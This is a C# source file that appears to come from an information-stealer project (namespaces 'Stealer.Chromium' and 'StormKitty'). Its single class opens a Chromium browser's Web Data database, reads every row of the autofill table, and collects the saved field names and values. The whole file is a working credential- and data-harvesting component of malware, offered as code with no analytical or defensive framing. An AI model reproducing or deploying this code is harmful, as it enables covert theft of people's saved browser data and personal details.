using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class Autofill
    {
        /// <summary>
        /// Get Autofill values from chromium based browsers
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with autofill</returns>
        public static List<AutoFill> Get(string sWebData)
        {
            List<AutoFill> acAutoFillData = new List<AutoFill>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSQLite == null) return acAutoFillData;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    AutoFill aFill = new AutoFill();

                    aFill.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    aFill.sValue = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

                    Counter.AutoFill++;
                    acAutoFillData.Add(aFill);
                }
            }
            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect autofill data\n" + ex); }
            return acAutoFillData;
        }
    }
}
